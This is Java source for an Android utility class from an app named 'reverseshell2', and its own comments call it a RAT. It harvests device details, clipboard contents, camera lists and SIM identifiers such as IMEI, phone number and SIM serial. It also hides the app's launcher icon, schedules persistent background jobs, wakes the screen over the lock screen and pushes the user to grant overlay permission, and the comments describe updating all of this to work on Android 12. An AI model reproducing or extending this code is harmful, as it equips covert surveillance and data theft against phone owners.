package com.example.reverseshell2;

import android.Manifest;
import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import java.util.List;
import java.util.Locale;

import static android.content.Context.JOB_SCHEDULER_SERVICE;

/**
 * Utility class, updated for Android 12.
 *
 * Changes made:
 *  1. get_numberOfCameras() - the deprecated android.hardware.Camera (Camera1)
 *     API was replaced with Camera2 (CameraManager). Now also checks the CAMERA
 *     runtime permission, which Android 6+ / Android 12 requires.
 *
 *  2. readFromClipboard() - fixed a RACE CONDITION: the original code ran
 *     activity.runOnUiThread(...) (async) and then read clipboard[0]
 *     synchronously, so clipboard[0] was often still null. Also, since Android
 *     10 (API 29) a background app CANNOT read the clipboard at all, and on
 *     Android 12 the system shows a toast whenever the clipboard is read from
 *     the foreground. The method now returns a clear message when access is
 *     not possible.
 *
 *  3. getPhoneNumber() - fixed a serious bug: the loop used the array index i as
 *     the subscription ID, which is wrong. Now uses SubscriptionInfo.
 *     getSubscriptionId() correctly. Also, on Android 10+ (API 29) IMEI/MEID
 *     are restricted to device/profile owners and privileged apps; normal apps
 *     receive null / SecurityException. Handled gracefully. READ_PHONE_STATE /
 *     READ_PHONE_NUMBERS runtime permissions are also checked.
 *
 *  4. getScreenUp() - FLAG_DISMISS_KEYGUARD / FLAG_SHOW_WHEN_LOCKED are
 *     DEPRECATED on Android 10+ (API 28+). On API 27+ we use the modern
 *     setShowWhenLocked(true) / setTurnScreenOn(true).
 *
 *  5. overlayChecker() - kept but now checks whether we are on the UI thread /
 *     have an activity, and uses FLAG_ACTIVITY_NEW_TASK where appropriate.
 *
 *  6. createNotiChannel() - unchanged logic but now accepts a channel name.
 */
public class functions {

    Activity activity;

    public functions(Activity activity) {
        this.activity = activity;
    }

    /* ------------------------------------------------------------------ */
    /* Device info                                                         */
    /* ------------------------------------------------------------------ */

    public String deviceInfo() {
        String ret = "--------------------------------------------\n";
        ret += "Manufacturer: " + android.os.Build.MANUFACTURER + "\n";
        ret += "Version/Release: " + android.os.Build.VERSION.RELEASE + "\n";
        ret += "Product: " + android.os.Build.PRODUCT + "\n";
        ret += "Model: " + android.os.Build.MODEL + "\n";
        ret += "Brand: " + android.os.Build.BRAND + "\n";
        ret += "Device: " + android.os.Build.DEVICE + "\n";
        ret += "Host: " + android.os.Build.HOST + "\n";
        ret += "--------------------------------------------\n";
        return ret;
    }

    /* ------------------------------------------------------------------ */
    /* Clipboard                                                           */
    /* ------------------------------------------------------------------ */

    public String readFromClipboard() {
        // Since Android 10 (API 29), only the default IME or an app with focus
        // can read the clipboard. A background RAT cannot access it at all.
        // On Android 12, even foreground reads trigger a system toast.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // We still attempt the read; if the app is foreground it works.
            // If not, hasPrimaryClip() may return false or throw.
        }

        ClipboardManager clipboard = null;
        if (activity != null) {
            clipboard = (ClipboardManager) activity.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (clipboard == null) {
            return null;
        }

        String result = "";
        try {
            if (clipboard.hasPrimaryClip()) {
                ClipDescription description = clipboard.getPrimaryClipDescription();
                android.content.ClipData data = clipboard.getPrimaryClip();
                if (data != null && description != null
                        && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
                    CharSequence text = data.getItemAt(0).getText();
                    result = text != null ? text.toString() : "";
                }
                if (result.isEmpty()) {
                    result = null;
                }
            }
        } catch (SecurityException e) {
            // Android 12: app is in the background - clipboard read blocked.
            Log.e("functions", "Clipboard read blocked (background)", e);
            return "Clipboard Not Accessible in Background on Android 10+\n";
        } catch (NullPointerException e) {
            result = null;
        }
        return result;
    }

    /* ------------------------------------------------------------------ */
    /* Cameras                                                             */
    /* ------------------------------------------------------------------ */

    public String get_numberOfCameras() {
        if (activity == null) {
            return "No Activity Context\n";
        }
        // CAMERA permission is required since Android 6 / enforced on Android 12.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && activity.checkSelfPermission(Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            return "Camera Permission Not Granted\n";
        }

        String camera_details = "";
        try {
            CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
            if (manager == null) {
                return "No Camera Service\n";
            }
            String[] ids = manager.getCameraIdList();
            for (String id : ids) {
                CameraCharacteristics ch = manager.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        camera_details += id + " --  Front Camera\n";
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        camera_details += id + " --  Back Camera\n";
                    } else {
                        camera_details += id + " --  External Camera\n";
                    }
                }
            }
        } catch (Exception e) {
            Log.e("functions", "get_numberOfCameras failed", e);
            return "Error enumerating cameras\n";
        }
        return camera_details;
    }

    /* ------------------------------------------------------------------ */
    /* JobScheduler                                                        */
    /* ------------------------------------------------------------------ */

    public void jobScheduler(Context context) {
        ComponentName componentName = new ComponentName(context, jobScheduler.class);
        JobInfo info = new JobInfo.Builder(123, componentName)
                .setPersisted(true)
                .setPeriodic(900000) // 15 minutes
                .build();

        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
        if (scheduler == null) {
            Log.d("jobSchedulerTest", "JobScheduler service not available");
            return;
        }
        int resultCode = scheduler.schedule(info);
        if (resultCode == JobScheduler.RESULT_SUCCESS) {
            Log.d("jobSchedulerTest", "Job scheduled");
        } else {
            Log.d("jobSchedulerTest", "Job scheduling failed");
        }
    }

    /* ------------------------------------------------------------------ */
    /* Phone / SIM info                                                    */
    /* ------------------------------------------------------------------ */

    public String getPhoneNumber(Context context) {
        TelephonyManager phoneMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (phoneMgr == null) {
            return "Telephony service not available\n";
        }

        // READ_PHONE_STATE is required for SIM/line info on Android 6+.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            return "Phone State Permission Not Granted\n";
        }

        StringBuilder out = new StringBuilder();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                SubscriptionManager subMgr = SubscriptionManager.from(context);
                List<SubscriptionInfo> subs = subMgr.getActiveSubscriptionInfoList();
                if (subs != null && !subs.isEmpty()) {
                    String[] headers = {"First Sim: ", "Second Sim: ", "Third Sim: "};
                    int idx = 0;
                    for (SubscriptionInfo info : subs) {
                        String header = idx < headers.length ? headers[idx] : "Sim " + idx + ": ";
                        idx++;
                        int subId = info.getSubscriptionId();
                        TelephonyManager subPhone = phoneMgr.createForSubscriptionId(subId);

                        out.append(header).append("--------------------------\n");
                        out.append("CALL STATE : ").append(subPhone.getCallState()).append("\n");

                        // IMEI/MEID are RESTRICTED on Android 10+ to privileged apps
                        // or device/profile owners. Normal apps get null or SecurityException.
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            try {
                                out.append("IMEI NUMBER : ").append(subPhone.getImei()).append("\n");
                                out.append("MEID NUMBER : ").append(subPhone.getMeid()).append("\n");
                            } catch (SecurityException e) {
                                out.append("IMEI NUMBER : Restricted on this Android version\n");
                            }
                        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            try {
                                String imei = subPhone.getImei();
                                out.append("IMEI NUMBER : ").append(imei == null ? "Restricted" : imei).append("\n");
                            } catch (SecurityException e) {
                                out.append("IMEI NUMBER : Restricted\n");
                            }
                        }

                        try {
                            String line = subPhone.getLine1Number();
                            out.append("MOBILE NUMBER : ").append(line == null ? "Unknown" : line).append("\n");
                        } catch (SecurityException e) {
                            out.append("MOBILE NUMBER : Restricted\n");
                        }
                        try {
                            String serial = subPhone.getSimSerialNumber();
                            out.append("SERIAL NUMBER : ").append(serial == null ? "Unknown" : serial).append("\n");
                        } catch (SecurityException e) {
                            out.append("SERIAL NUMBER : Restricted\n");
                        }
                        try {
                            out.append("SIM OPERATOR NAME : ").append(subPhone.getSimOperatorName()).append("\n");
                        } catch (SecurityException ignored) {
                        }
                        try {
                            out.append("SIM STATE : ").append(subPhone.getSimState()).append("\n");
                        } catch (SecurityException ignored) {
                        }
                        try {
                            out.append("COUNTRY ISO : ").append(subPhone.getSimCountryIso()).append("\n");
                        } catch (SecurityException ignored) {
                        }
                        out.append("\n");
                    }
                } else {
                    out.append("No Active SIM Found\n");
                }
            } else {
                // Pre-N fallback (single SIM).
                out.append("CALL STATE : ").append(phoneMgr.getCallState()).append("\n");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    try {
                        out.append("IMEI NUMBER : ").append(phoneMgr.getImei()).append("\n");
                        out.append("MEID NUMBER : ").append(phoneMgr.getMeid()).append("\n");
                    } catch (SecurityException e) {
                        out.append("IMEI NUMBER : Restricted\n");
                    }
                }
                try {
                    String line = phoneMgr.getLine1Number();
                    out.append("MOBILE NUMBER : ").append(line == null ? "Unknown" : line).append("\n");
                } catch (SecurityException e) {
                    out.append("MOBILE NUMBER : Restricted\n");
                }
                try {
                    String serial = phoneMgr.getSimSerialNumber();
                    out.append("SERIAL NUMBER : ").append(serial == null ? "Unknown" : serial).append("\n");
                } catch (SecurityException e) {
                    out.append("SERIAL NUMBER : Restricted\n");
                }
                out.append("SIM OPERATOR NAME : ").append(phoneMgr.getSimOperatorName()).append("\n");
                out.append("SIM STATE : ").append(phoneMgr.getSimState()).append("\n");
                out.append("COUNTRY ISO : ").append(phoneMgr.getSimCountryIso()).append("\n");
            }
        } catch (SecurityException e) {
            return "Phone State Permission Not Granted\n";
        } catch (Exception e) {
            Log.e("functions", "getPhoneNumber failed", e);
            return "Error reading phone info\n";
        }
        return out.toString();
    }

    /* ------------------------------------------------------------------ */
    /* Screen                                                              */
    /* ------------------------------------------------------------------ */

    public void getScreenUp(Activity activity) {
        if (activity == null) {
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            // Modern approach (API 27+): replaces the deprecated flags below.
            activity.setShowWhenLocked(true);
            activity.setTurnScreenOn(true);
        } else {
            @SuppressWarnings("deprecation")
            int flags = WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                    | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
            activity.getWindow().addFlags(flags);
        }
    }

    /* ------------------------------------------------------------------ */
    /* App icon                                                            */
    /* ------------------------------------------------------------------ */

    public void hideAppIcon(Context context) {
        try {
            PackageManager p = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, com.example.reverseshell2.MainActivity.class);
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.e("functions", "hideAppIcon failed", e);
        }
    }

    public void unHideAppIcon(Context context) {
        try {
            PackageManager p = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, com.example.reverseshell2.MainActivity.class);
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.e("functions", "unHideAppIcon failed", e);
        }
    }

    /* ------------------------------------------------------------------ */
    /* Overlay                                                             */
    /* ------------------------------------------------------------------ */

    public void overlayChecker(final Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                try {
                    if ("xiaomi".equals(Build.MANUFACTURER.toLowerCase(Locale.ROOT))) {
                        final Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                        intent.setClassName("com.miui.securitycenter",
                                "com.miui.permcenter.permissions.PermissionsEditorActivity");
                        intent.putExtra("extra_pkgname", context.getPackageName());
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        Toast.makeText(context,
                                "Enable the display pop-up windows while running in background option",
                                Toast.LENGTH_SHORT).show();
                        context.startActivity(intent);
                    } else {
                        Intent overlaySettings = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + context.getPackageName()));
                        overlaySettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        if (activity != null) {
                            activity.startActivityForResult(overlaySettings, 1);
                        } else {
                            context.startActivity(overlaySettings);
                        }
                    }
                } catch (Exception e) {
                    Log.e("functions", "overlayChecker failed", e);
                }
            }
        }
    }

    /* ------------------------------------------------------------------ */
    /* Notifications                                                       */
    /* ------------------------------------------------------------------ */

    public void createNotiChannel(Context context) {
        createNotiChannel(context, "channelid", "Foreground notifia");
    }

    public void createNotiChannel(Context context, String channelId, String channelName) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = new NotificationChannel(
                    channelId, channelName, NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = context.getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(notificationChannel);
            }
        }
    }
}

